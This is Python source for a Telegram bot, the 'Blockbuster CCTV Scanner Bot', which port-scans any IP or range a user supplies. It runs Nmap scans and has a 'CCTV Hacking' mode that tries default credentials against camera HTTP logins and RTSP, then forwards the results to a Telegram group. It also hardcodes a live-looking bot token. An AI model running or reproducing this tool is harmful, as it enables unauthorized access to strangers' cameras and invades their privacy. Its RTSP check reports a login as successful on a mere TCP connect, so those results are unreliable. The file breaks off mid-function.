import socket
import ipaddress
import re
import concurrent.futures
import requests
import time
import os
import asyncio
import logging
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.error import NetworkError, BadRequest, Conflict, TimedOut
from aiohttp import web
import nmap

# Set up logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Hardcoded bot token
BOT_TOKEN = "8049406807:AAGhuUh9fOm5wt7OvTobuRngqY0ZNBMxlHE"
# Placeholder group ID
GROUP_ID = "-1002522049841"  # Replace with actual group ID
# Admin chat ID for notifications
ADMIN_CHAT_ID = "6972264549"  # Replace with your Telegram chat ID

# Global data storage
scan_results = {}
scan_locks = {}
message_ids = {}
scan_stop = {}
last_message_state = {}
awaiting_input = {}
recent_scans = []
start_time = time.time()
scan_expiry = {}
multi_scan_selections = {}
last_command_time = {}  # Kept for potential future use, not used now
scan_queue = asyncio.Queue(maxsize=20)  # Max 20 queued scans
scan_semaphore = asyncio.Semaphore(5)  # Max 5 concurrent scans
lock_timeouts = {}  # Track lock start time for timeout

# Common CCTV ports
CCTV_PORTS = [80, 554, 8000, 8080, 8443]
UDP_PORTS = [37020]

# Port to service mapping
SERVICE_MAP = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http",
    110: "pop3", 143: "imap", 443: "https", 445: "smb", 3389: "rdp",
    53: "dns", 3306: "mysql", 5432: "postgresql", 8080: "http-alt",
    554: "rtsp", 8000: "http-alt", 8443: "https-alt", 37020: "onvif"
}

# Extended default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""),
    ("root", "root"), ("root", ""), ("admin", "666666"),
    ("admin", "password"), ("user", "user")
]

# Known vulnerabilities
VULN_ALERTS = {
    80: "HTTP port open. Vulnerable to default credential brute-forcing. Change default passwords and enable MFA.",
    554: "RTSP port open. Unsecured streams may allow unauthorized video access. Secure with authentication.",
    8080: "HTTP-alt port open. Often used by CCTV web interfaces. Update firmware to patch vulnerabilities.",
    8000: "HTTP-alt port open. Check for weak credentials and update firmware.",
    8443: "HTTPS-alt port open. Ensure SSL certificates are valid and credentials are strong.",
    37020: "ONVIF discovery (UDP). May expose camera details. Restrict network access."
}

# HTTP server for health checks and keep-alive
async def health_check(request):
    client_ip = request.remote
    logger.info(f"Keep-alive ping received from {client_ip}")
    return web.Response(text="OK")

async def start_http_server():
    try:
        logger.info("Starting HTTP server for keep-alive...")
        app = web.Application()
        app.add_routes([web.get('/health', health_check)])
        port = int(os.getenv("KEEP_ALIVE_PORT", 8080))
        logger.info(f"Binding HTTP server to port {port}")
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"HTTP server started on port {port}")
        return runner
    except Exception as e:
        logger.error(f"Failed to start HTTP server: {str(e)}")
        raise

# Validate IP address
def is_valid_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Detect camera model via HTTP
def detect_camera_model(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url, timeout=5, allow_redirects=False)
        headers = response.headers
        server = headers.get("Server", "Unknown")
        title = re.search(r"<title>(.*?)</title>", response.text, re.I)
        title = title.group(1) if title else "Unknown"
        return f"Server: {server}, Page Title: {title}"
    except Exception as e:
        logger.error(f"Error detecting camera model on {ip}:{port}: {e}")
        return "Unknown"

# Test default credentials (HTTP)
def test_default_creds(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            url = f"http://{ip}:{port}/login"
            response = requests.post(url, data={"username": username, "password": password}, timeout=5)
            if response.status_code == 200 and "login failed" not in response.text.lower():
                results.append(f"✅ Success: {username}:{password}")
            else:
                results.append(f"❌ Failed: {username}:{password}")
        except Exception as e:
            logger.error(f"Error testing creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ Error: {username}:{password}")
    return results

# Test RTSP brute-forcing
def test_rtsp_brute(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
            else:
                results.append(f"❌ RTSP Failed: {username}:{password}")
        except Exception as e:
            logger.error(f"Error testing RTSP creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ RTSP Error: {username}:{password}")
    return results

# Test ONVIF protocol
def test_onvif(ip, port):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        response = requests.get(url, timeout=5)
        return "ONVIF supported" if response.status_code == 200 else "ONVIF not detected"
    except Exception as e:
        logger.error(f"Error testing ONVIF on {ip}:{port}: {e}")
        return "Error testing ONVIF"

# Check cached scan results
def get_cached_scan(ip, chat_id):
    current_time = time.time()
    for scan in recent_scans:
        if scan["ip"] == ip and current_time - scan["timestamp"] <= 24 * 3600:
            scan_results[chat_id] = {
                "open": scan["open"],
                "closed_count": 0,
                "details": {},
                "mac": scan["mac"],
                "os": scan.get("os", "Unknown")
            }
            scan_expiry[chat_id] = current_time + 600
            return scan
    return None

# Clear stuck locks (admin only)
async def clear_locks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if str(chat_id) != ADMIN_CHAT_ID:
        await update.message.reply_text("⚠️ Only admin can use this command.")
        return

    scan_locks.clear()
    scan_stop.clear()
    message_ids.clear()
    last_message_state.clear()
    awaiting_input.clear()
    lock_timeouts.clear()
    while not scan_queue.empty():
        try:
            scan_queue.get_nowait()
            scan_queue.task_done()
        except asyncio.QueueEmpty:
            break
    logger.info(f"Admin cleared all locks and queue for chat_id {chat_id}")
    await update.message.reply_text("✅ All locks and queue cleared.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    keyboard = [
        [InlineKeyboardButton("🌐 IP Scanning (All 65,535 Ports)", callback_data=f"ip_scan_{chat_id}")],
        [InlineKeyboardButton("🎥 CCTV Hacking", callback_data=f"cctv_hack_{chat_id}")],
        [InlineKeyboardButton("🔍 Nmap Advanced Scan", callback_data=f"nmap_scan_{chat_id}")],
        [InlineKeyboardButton("🔧 Multi-Nmap Scan", callback_data=f"multi_nmap_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 **Blockbuster CCTV Scanner Bot** 🎬\n\n"
        "Choose an option:\n"
        "🌐 **IP Scanning**: Scan all 65,535 TCP ports (~10-20 min)\n"
        "🎥 **CCTV Hacking**: Scan CCTV ports & brute-force RTSP (~1-2 sec)\n"
        "🔍 **Nmap Advanced Scan**: Single Nmap-style scan (TCP, UDP, OS, MAC, etc.)\n"
        "🔧 **Multi-Nmap Scan**: Combine multiple Nmap scans (e.g., TCP + Version + OS)",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if chat_id in scan_locks and scan_locks[chat_id]:
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped.")
    else:
        await update.message.reply_text("⚠️ No scan in progress.")

async def get_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_time = time.time()
    valid_results = [res for res in recent_scans if current_time - res["timestamp"] <= 24 * 3600]
    if valid_results:
        result = "Recent scan results:\n"
        for res in valid_results:
            ports = [f"{port} ({proto})" for port, proto in res["open"]]
            mac = res.get("mac", "N/A")
            result += f"IP: {res['ip']}, Open ports: {', '.join(ports)}, MAC: {mac}, Scanned: {time.ctime(res['timestamp'])}\n"
    else:
        result = "No recent scan results available (within 24 hours)."
    await update.message.reply_text(result)

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    scan_count = len(recent_scans)
    await update.message.reply_text(f"Bot Stats:\nTotal Scans: {scan_count}")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = time.time() - start_time
    uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
    scan_count = len(recent_scans)
    queue_size = scan_queue.qsize()
    active_scans = sum(1 for lock in scan_locks.values() if lock)
    await update.message.reply_text(
        f"**Bot Status** 📊\n"
        f"Uptime: {uptime_str}\n"
        f"Total Scans: {scan_count}\n"
        f"Active Scans: {active_scans}\n"
        f"Queued Scans: {queue_size}",
        parse_mode="Markdown"
    )

# Nmap scan function
async def nmap_scan(ip, chat_id, update, context, scan_types):
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ Invalid IP: {ip}")
        return

    # Check cache
    cached = get_cached_scan(ip, chat_id)
    if cached:
        ports = [f"{port} ({proto})" for port, proto in cached["open"]]
        await update.message.reply_text(
            f"📜 Cached result for **{ip}** (Scanned: {time.ctime(cached['timestamp'])}):\n"
            f"Open ports: {', '.join(ports)}\nMAC: {cached['mac']}\nOS: {cached['os']}",
            parse_mode="Markdown"
        )
        return

    async with scan_semaphore:
        try:
            scan_locks[chat_id] = True
            lock_timeouts[chat_id] = time.time() + 900  # 15 min timeout for Nmap
            scan_stop[chat_id] = False
            scan_results[chat_id] = {"open": [], "closed_count": 0, "details": {}, "mac": "N/A", "os": "Unknown"}
            scan_expiry[chat_id] = time.time() + 600

            nm = nmap.PortScanner()
            scan_args = []
            scan_types = list(set(scan_types))
            if "sT" in scan_types and "sS" in scan_types:
                scan_types.remove("sS")
            if "A" in scan_types:
                scan_args.append("-A")
            else:
                for st in scan_types:
                    scan_args.append(f"-{st}")
            args = " ".join(scan_args) + " -Pn -T4 --min-rate 100 --max-rate 500"
            eta_text = "5-15 min" if "A" in scan_types or len(scan_types) > 2 else "1-5 min"

            logger.info(f"Nmap scanning {ip} with args: {args}")

            msg = await update.message.reply_text(
                f"🔍 Nmap scanning **{ip}** [0%] (ETA: {eta_text}, Types: {', '.join(scan_types)})",
                parse_mode="Markdown"
            )
            message_ids[chat_id] = msg.message_id
            last_message_state[chat_id] = {"text": "", "open": 0, "closed": 0}

            # Run Nmap with timeout
            try:
                async with asyncio.timeout(600):  # 10 min timeout
                    nm.scan(ip, arguments=args)
            except asyncio.TimeoutError:
                logger.error(f"Nmap scan timed out for {ip}")
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_ids[chat_id],
                    text=f"⚠️ Nmap scan timed out for **{ip}**. Try a lighter scan like -sT.",
                    parse_mode="Markdown"
                )
                return

            for host in nm.all_hosts():
                scan_results[chat_id]["open"] = []
                scan_results[chat_id]["details"] = {}
                mac = nm[host].get("addresses", {}).get("mac", "N/A")
                scan_results[chat_id]["mac"] = mac
                # Safely handle OS detection
                osmatch = nm[host].get("osmatch", [])
                os_info = osmatch[0]["name"] if osmatch else "Unknown"
                scan_results[chat_id]["os"] = os_info

                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]["state"]
                        service = nm[host][proto][port].get("name", "unknown")
                        version = nm[host][proto][port].get("product", "") + " " + nm[host][proto][port].get("version", "")
                        script_output = nm[host][proto][port].get("script", {})
                        if state == "open":
                            scan_results[chat_id]["open"].append((port, proto))
                            details = {"service": service, "version": version}
                            if script_output:
                                details["script"] = "\n".join([f"{k}: {v}" for k, v in script_output.items()])
                            scan_results[chat_id]["details"][(port, proto)] = details
                        else:
                            scan_results[chat_id]["closed_count"] += 1

            await update_buttons(chat_id, context, ip, 100, 0, "nmap")
            if scan_results[chat_id]["open"]:
                ports = [f"{port} ({proto})" for port, proto in scan_results[chat_id]["open"]]
                group_msg = f"Nmap scan result for {ip}:\nOpen ports: {', '.join(ports)}\nMAC: {scan_results[chat_id]['mac']}\nOS: {scan_results[chat_id]['os']}\nScanned: {time.ctime()}"
                try:
                    await context.bot.send_message(chat_id=GROUP_ID, text=group_msg)
                    logger.info(f"Sent Nmap scan result to group {GROUP_ID}")
                except Exception as e:
                    logger.error(f"Error sending to group: {str(e)}")
                recent_scans.append({
                    "ip": ip,
                    "open": scan_results[chat_id]["open"],
                    "mac": scan_results[chat_id]["mac"],
                    "os": scan_results[chat_id]["os"],
                    "timestamp": time.time()
                })

        except Exception as e:
            logger.error(f"Nmap scan error for {ip}: {str(e)}\nStack trace: {traceback.format_exc()}")
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_ids[chat_id],
                text=f"⚠️ Nmap scan failed for **{ip}**: {str(e)}\nTry non-privileged scans like -sT or -sV.",
                parse_mode="Markdown"
            )
        finally:
            scan_locks.pop(chat_id, None)
            scan_stop.pop(chat_id, None)
            message_ids.pop(chat_id, None)
            last_message_state.pop(chat_id, None)
            awaiting_input.pop(chat_id, None)
            multi_scan_selections.pop(chat_id, None)
            lock_timeouts.pop(chat_id, None)
            logger.info(f"Cleaned up scan state for chat_id {chat_id}")

# Port scanner function
def scan_port(ip, port, chat_id, protocol="tcp"):
    if scan_stop.get(chat_id, False):
        return None
    try:
        sock_type = socket.SOCK_DGRAM if protocol == "udp" else socket.SOCK_STREAM
        sock = socket.socket(socket.AF_INET, sock_type)
        sock.settimeout(0.3 if protocol == "tcp" else 1.0)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port, result == 0, protocol
    except Exception as e:
        logger.error(f"Error scanning port {port} ({protocol}): {e}")
        return None

# Single IP scan
async def scan_single_ip(ip, chat_id, update, context, is_cctv=False):
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ Invalid IP: {ip}")
        return

    # Check cache
    cached = get_cached_scan(ip, chat_id)
    if cached:
        ports = [f"{port} ({proto})" for port, proto in cached["open"]]
        await update.message.reply_text(
            f"📜 Cached result for **{ip}** (Scanned: {time.ctime(cached['timestamp'])}):\n"
            f"Open ports: {', '.join(ports)}\nMAC: {cached['mac']}",
            parse_mode="Markdown"
        )
        return

    async with scan_semaphore:
        try:
            scan_locks[chat_id] = True
            lock_timeouts[chat_id] = time.time() + 1200  # 20 min timeout for IP scan
            scan_stop[chat_id] = False
            scan_results[chat_id] = {"open": [], "closed_count": 0, "details": {}, "mac": "N/A", "os": "Unknown"}
            scan_expiry[chat_id] = time.time() + 600

            if is_cctv:
                scan_ports = [(p, "tcp") for p in CCTV_PORTS] + [(p, "udp") for p in UDP_PORTS]
                eta_text = "~1-2 sec"
            else:
                scan_ports = [(p, "tcp") for p in range(1, 65536)] + [(p, "udp") for p in UDP_PORTS]
                eta_text = "~10-20 min"
            total_ports = len(scan_ports)

            logger.info(f"Scanning {ip}: {total_ports} ports ({len(scan_ports) - len(UDP_PORTS)} TCP + {len(UDP_PORTS)} UDP)")

            start_time = time.time()
            msg = await update.message.reply_text(
                f"🔍 Scanning **{ip}** [0%] (ETA: {eta_text}, {total_ports} ports)",
                parse_mode="Markdown"
            )
            message_ids[chat_id] = msg.message_id
            last_message_state[chat_id] = {"text": "", "open": 0, "closed": 0}

            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(scan_port, ip, port, chat_id, proto) for port, proto in scan_ports]
                completed = 0
                update_interval = max(total_ports // 10, 1000)
                for future in concurrent.futures.as_completed(futures):
                    if scan_stop.get(chat_id, False):
                        break
                    result = future.result()
                    completed += 1
                    if result:
                        port, is_open, protocol = result
                        if is_open:
                            scan_results[chat_id]["open"].append((port, protocol))
                            details = {}
                            if protocol == "tcp" and port in [80, 8080, 8000, 8443]:
                                details["model"] = detect_camera_model(ip, port)
                                details["creds"] = test_default_creds(ip, port)
                                details["onvif"] = test_onvif(ip, port)
                            if protocol == "tcp" and port == 554 and is_cctv:
                                details["rtsp"] = test_rtsp_brute(ip, port)
                            if protocol == "udp" and port == 37020:
                                details["onvif"] = "ONVIF discovery active (UDP)"
                            scan_results[chat_id]["details"][(port, protocol)] = details
                        else:
                            scan_results[chat_id]["closed_count"] += 1
                    if completed % update_interval == 0:
                        progress = (completed / total_ports) * 100
                        elapsed = time.time() - start_time
                        eta = (elapsed / completed * total_ports - elapsed) if completed > 0 else 0
                        await update_buttons(chat_id, context, ip, progress, eta if not is_cctv else 0, "ip" if not is_cctv else "cctv")

            if scan_stop.get(chat_id, False):
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_ids[chat_id],
                    text=f"🛑 Scan stopped for **{ip}**", parse_mode="Markdown"
                )
            else:
                await update_buttons(chat_id, context, ip, 100, 0, "ip" if not is_cctv else "cctv")
                if scan_results[chat_id]["open"]:
                    ports = [f"{port} ({proto})" for port, proto in scan_results[chat_id]["open"]]
                    group_msg = f"Scan result for {ip}:\nOpen ports: {', '.join(ports)}\nMAC: {scan_results[chat_id]['mac']}\nScanned: {time.ctime()}"
                    try:
                        await context.bot.send_message(chat_id=GROUP_ID, text=group_msg)
                        logger.info(f"Sent scan result to group {GROUP_ID}")
                    except Exception as e:
                        logger.error(f"Error sending to group: {str(e)}")
                    recent_scans.append({
                        "ip": ip,
                        "open": scan_results[chat_id]["open"],
                        "mac": scan_results[chat_id]["mac"],
                        "timestamp": time.time()
                    })

        except Exception as e:
            logger.error(f"IP scan error: {str(e)}")
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_ids[chat_id],
                text=f"⚠️ IP scan failed for **{ip}**: {str(e)}",
                parse_mode="Markdown"
            )
        finally:
            scan_locks.pop(chat_id, None)
            scan_stop.pop(chat_id, None)
            message_ids.pop(chat_id, None)
            last_message_state.pop(chat_id, None)
            awaiting_input.pop(chat_id, None)
            lock_timeouts.pop(chat_id, None)
            logger.info(f"Cleaned up scan state for chat_id {chat_id}")

# CIDR Range scan
async def scan_cidr(cidr, chat_id, update, context, is_cctv=False):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        await update.message.reply_text(
            f"🌐 Scanning **{cidr}** ({net.num_addresses} IPs)...", parse_mode="Markdown"
        )
        for ip in net.hosts():
            if scan_stop.get(chat_id, False):
                break
            await scan_single_ip(str(ip), chat_id, update, context, is_cctv=is_cctv)
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")
        scan_locks.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        logger.info(f"Cleaned up scan state for chat_id {chat_id}")

# Live button updater
async def update_buttons(chat_id, context, ip, progress, eta, scan_type):
    open_ports = len(scan_results.get(chat_id, {}).get("open", []))
    closed_ports = scan_results.get(chat_id, {}).get("closed_count", 0)
    eta_text = f", ETA: {int(eta // 60)}m {int(eta % 60)}s" if eta > 0 else ""
    progress_text = f"🔍 {scan_type.upper()} Scanning **{ip}** [{progress:.1f}%{eta_text}]"

    last_state = last_message_state.get(chat_id, {"text": "", "open": -1, "closed": -1})
    if (last_state["text"] == progress_text and
        last_state["open"] == open_ports and
        last_state["closed"] == closed_ports):
        return

    keyboard = [
        [InlineKeyboardButton(f"🟢 Open Ports: {open_ports}", callback_data=f"open_{chat_id}")],
        [InlineKeyboardButton(f"🔴 Closed Ports: {closed_ports}", callback_data=f"closed_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_ids[chat_id],
            text=progress_text,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
        last_message_state[chat_id] = {"text": progress_text, "open": open_ports, "closed": closed_ports}
    except Exception as e:
        if "Message is not modified" not in str(e):
            logger.error(f"Error updating buttons: {e}")

# Button click handler
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    logger.info(f"Button clicked: chat_id={chat_id}, data={query.data}")

    try:
        if query.data.startswith("ip_scan_"):
            awaiting_input[chat_id] = "ip_scan"
            await query.message.reply_text(
                "🌐 Enter an IP or CIDR range for full 65,535 port scan (e.g., `192.168.1.1` or `192.168.1.0/24`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("cctv_hack_"):
            awaiting_input[chat_id] = "cctv_hack"
            await query.message.reply_text(
                "🎥 Enter an IP for CCTV hacking (e.g., `192.168.1.1`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("nmap_scan_"):
            keyboard = [
                [InlineKeyboardButton("TCP Connect (-sT)", callback_data=f"nmap_sT_{chat_id}")],
                [InlineKeyboardButton("SYN Scan (-sS)", callback_data=f"nmap_sS_{chat_id}")],
                [InlineKeyboardButton("UDP Scan (-sU)", callback_data=f"nmap_sU_{chat_id}")],
                [InlineKeyboardButton("Version Detection (-sV)", callback_data=f"nmap_sV_{chat_id}")],
                [InlineKeyboardButton("Script Scan (-sC)", callback_data=f"nmap_sC_{chat_id}")],
                [InlineKeyboardButton("OS Detection (-O)", callback_data=f"nmap_O_{chat_id}")],
                [InlineKeyboardButton("Aggressive (-A)", callback_data=f"nmap_A_{chat_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(
                "🔍 Select Nmap scan type:",
                reply_markup=reply_markup
            )
        elif query.data.startswith("multi_nmap_"):
            multi_scan_selections[chat_id] = []
            await show_multi_nmap_menu(chat_id, query.message, context)
        elif query.data.startswith("multi_select_"):
            scan_type = query.data.split("_")[2]
            if scan_type in multi_scan_selections[chat_id]:
                multi_scan_selections[chat_id].remove(scan_type)
            else:
                multi_scan_selections[chat_id].append(scan_type)
            await show_multi_nmap_menu(chat_id, query.message, context)
        elif query.data.startswith("multi_confirm_"):
            if not multi_scan_selections.get(chat_id):
                await query.message.reply_text("⚠️ Please select at least one scan type.")
                return
            awaiting_input[chat_id] = "multi_nmap"
            await query.message.reply_text(
                f"🔧 Enter an IP for Multi-Nmap scan ({', '.join(multi_scan_selections[chat_id])}):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("nmap_"):
            scan_type = query.data.split("_")[1]
            awaiting_input[chat_id] = f"nmap_{scan_type}"
            await query.message.reply_text(
                f"🔍 Enter an IP for Nmap {scan_type} scan (e.g., `192.168.1.1`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith(("open_", "closed_")):
            action, button_chat_id = query.data.split("_", 1)
            logger.info(f"Action: {action}, Button chat_id: {button_chat_id}")

            if button_chat_id != str(chat_id):
                await query.message.reply_text("⚠️ Chat ID mismatch. Please start a new scan.")
                return

            if chat_id not in scan_results or time.time() > scan_expiry.get(chat_id, 0):
                await query.message.reply_text("⚠️ Scan data expired or not found. Please start a new scan.")
                return

            if action == "open":
                open_ports = scan_results[chat_id].get("open", [])
                if not open_ports:
                    await query.message.reply_text("🟢 No Open Ports Found!")
                else:
                    ports_text = []
                    for port, protocol in sorted(open_ports)[:50]:
                        port_info = f"✅ Port {port} ({protocol.upper()}): {SERVICE_MAP.get(port, 'unknown')} (open)"
                        if (port, protocol) in scan_results[chat_id]["details"]:
                            details = scan_results[chat_id]["details"][(port, protocol)]
                            if "model" in details:
                                port_info += f"\n  - Model: {details['model']}"
                            if "creds" in details:
                                port_info += f"\n  - HTTP Credentials: {', '.join(details['creds'])}"
                            if "rtsp" in details:
                                port_info += f"\n  - RTSP Brute: {', '.join(details['rtsp'])}"
                            if "onvif" in details:
                                port_info += f"\n  - ONVIF: {details['onvif']}"
                            if "service" in details:
                                port_info += f"\n  - Service: {details['service']}"
                            if "version" in details and details["version"].strip():
                                port_info += f"\n  - Version: {details['version']}"
                            if "script" in details:
                                port_info += f"\n  - Script Output: {details['script']}"
                        if port in VULN_ALERTS:
                            port_info += f"\n  - ⚠️ {VULN_ALERTS[port]}"
                        ports_text.append(port_info)
                    mac = scan_results[chat_id].get("mac", "N/A")
                    os = scan_results[chat_id].get("os", "Unknown")
                    await query.message.reply_text(
                        f"**🟢 Open Ports (Top {min(len(open_ports), 50)}):**\n" +
                        "\n".join(ports_text) +
                        f"\n\n**MAC Address**: {mac}\n**OS Guess**: {os}",
                        parse_mode="Markdown"
                    )

            elif action == "closed":
                closed_count = scan_results[chat_id].get("closed_count", 0)
                if closed_count == 0:
                    await query.message.reply_text("🔴 No Closed Ports Found!")
                else:
                    await query.message.reply_text(
                        f"**🔴 Closed Ports:** {closed_count}\n(Too many to list individually)", parse_mode="Markdown"
                    )

    except Exception as e:
        logger.error(f"Error in button_click: {e}")
        await query.message.reply_text(f"⚠️ Error processing button: {str(e)}")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Bot error: {str(e)}"
            )
        except Exception as admin_e:
            logger.error(f"Failed to notify admin: {admin_e}")

# Multi-Nmap menu
async def show_multi_nmap_menu(chat_id, message, context):
    scan_options = ["sT", "sS", "sU", "sV", "sC", "O", "A"]
    keyboard = []
    for opt in scan_options:
        label = f"{'✅' if opt in multi_scan_selections.get(chat_id, []) else '⬜'} {opt}"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"multi_select_{opt}_{chat_id}")])
    keyboard.append([InlineKeyboardButton("✔️ Confirm Selection", callback_data=f"multi_confirm_{chat_id}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        await message.edit_text(
            "🔧 Select Nmap scan types (multiple allowed):",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error updating multi-nmap menu: {e}")
        await message.reply_text("🔧 Select Nmap scan types (multiple allowed):", reply_markup=reply_markup)

# Handle user input
async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id

    # Check lock timeout
    current_time = time.time()
    if chat_id in lock_timeouts and current_time > lock_timeouts[chat_id]:
        logger.info(f"Clearing timed out lock for chat_id {chat_id}")
        scan_locks.pop(chat_id, None)
        scan_stop.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        awaiting_input.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)

    # Cancel any ongoing scan for this chat_id
    if scan_locks.get(chat_id, False):
        logger.info(f"Canceling previous scan for chat_id {chat_id}")
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        last_message_state.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped. Starting new scan...")
        await asyncio.sleep(1)  # Brief delay to ensure old scan stops

    if chat_id not in awaiting_input:
        await update.message.reply_text("⚠️ Please use /start to choose an option.")
        return

    target = update.message.text.strip()
    mode = awaiting_input[chat_id]

    # Start new scan instantly
    logger.info(f"Starting new scan: mode={mode}, ip={target}, chat_id={chat_id}")
    try:
        if mode == "ip_scan":
            if "/" in target:
                await scan_cidr(target, chat_id, update, context, is_cctv=False)
            else:
                await scan_single_ip(target, chat_id, update, context, is_cctv=False)
        elif mode == "cctv_hack":
            if "/" not in target:
                await scan_single_ip(target, chat_id, update, context, is_cctv=True)
            else:
                await update.message.reply_text("⚠️ CCTV hacking supports single IPs only. Use `192.168.1.1`.")
        elif mode.startswith("nmap_"):
            scan_type = mode.split("_")[1]
            await nmap_scan(target, chat_id, update, context, [scan_type])
        elif mode == "multi_nmap":
            if "/" not in target:
                await nmap_scan(target, chat_id, update, context, multi_scan_selections[chat_id])
            else:
                await update.message.reply_text("⚠️ Multi-Nmap scans support single IPs only. Use `192.168.1.1`.")
    except Exception as e:
        logger.error(f"Error starting new scan for chat_id {chat_id}: {str(e)}")
        await update.message.reply_text(f"⚠️ Scan failed: {str(e)}")
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Scan error for chat {chat_id}: {str(e)}"
            )
        except Exception as admin_e:
            logger.error(f"Failed to notify admin: {admin_e}")

async def process_scan_queue(app):
    logger.info("Starting scan queue processor")
    while True:
        try:
            async with asyncio.timeout(1200):  # 20 min timeout per scan
                mode, target, chat_id, update, context = await scan_queue.get()
                logger.info(f"Processing scan queue task: mode={mode}, ip={target}, chat_id={chat_id}")
                try:
                    if mode == "ip_scan":
                        if "/" in target:
                            await scan_cidr(target, chat_id, update, context, is_cctv=False)
                        else:
                            await scan_single_ip(target, chat_id, update, context, is_cctv=False)
                    elif mode == "cctv_hack":
                        if "/" not in target:
                            await scan_single_ip(target, chat_id, update, context, is_cctv=True)
                        else:
                            await app.bot.send_message(
                                chat_id=chat_id,
                                text="⚠️ CCTV hacking supports single IPs only. Use `192.168.1.1`."
                            )
                    elif mode.startswith("nmap_"):
                        scan_type = mode.split("_")[1]
                        await nmap_scan(target, chat_id, update, context, [scan_type])
                    elif mode == "multi_nmap":
                        if "/" not in target:
                            await nmap_scan(target, chat_id, update, context, multi_scan_selections[chat_id])
                        else:
                            await app.bot.send_message(
                                chat_id=chat_id,
                                text="⚠️ Multi-Nmap scans support single IPs only. Use `192.168.1.1`."
                            )
                finally:
                    scan_queue.task_done()
                    logger.info(f"Completed scan queue task for chat_id {chat_id}")
                await asyncio.sleep(1)
        except asyncio.TimeoutError:
            logger.error(f"Scan queue task timed out for chat_id {chat_id}")
            try:
                await app.bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ Scan timed out. Please try again."
                )
                await app.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"⚠️ Scan queue timeout for chat {chat_id}"
                )
            except Exception as admin_e:
                logger.error(f"Failed to notify: {admin_e}")
            scan_queue.task_done()
        except Exception as e:
            logger.error(f"Error processing scan queue: {e}")
            try:
                await app.bot.send_message(
                    chat_id=chat_id,
                    text=f"⚠️ Scan failed: {str(e)}"
                )
                await app.bot.send_message(
